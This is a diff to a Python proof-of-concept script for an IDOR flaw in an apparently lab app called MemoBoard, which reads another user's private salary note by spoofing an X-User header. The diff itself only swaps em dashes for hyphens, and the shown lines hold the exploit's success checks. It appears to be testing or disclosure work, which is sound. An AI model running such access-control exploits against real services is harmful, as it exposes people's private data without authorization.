@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""PoC: MemoBoard IDOR — read any user's private note without authorization
+"""PoC: MemoBoard IDOR - read any user's private note without authorization
 
 GET /api/notes/<id> reads X-User header but never checks ownership.
 Any user can read any note by id, including bob's private salary note.
@@ -70,12 +70,12 @@ def main() -> int:
             print(f"\n[+] Note author: {author}")
             print(f"[+] Note body: {note_body}")
             if author != args.x_user:
-                print(f"\n[+] SUCCESS: IDOR confirmed — accessed {author}'s note while claiming to be {args.x_user}.")
+                print(f"\n[+] SUCCESS: IDOR confirmed - accessed {author}'s note while claiming to be {args.x_user}.")
                 if "128000" in note_body or "salary" in note_body.lower() or "confidential" in note_body.lower():
                     print(f"[+] Sensitive data exposed: private salary information leaked.")
                 return 0
             else:
-                print(f"\n[-] Note belongs to the claimed user — not an IDOR.")
+                print(f"\n[-] Note belongs to the claimed user - not an IDOR.")
                 return 1
         except json.JSONDecodeError:
             print("\n[!] Response is not valid JSON.")
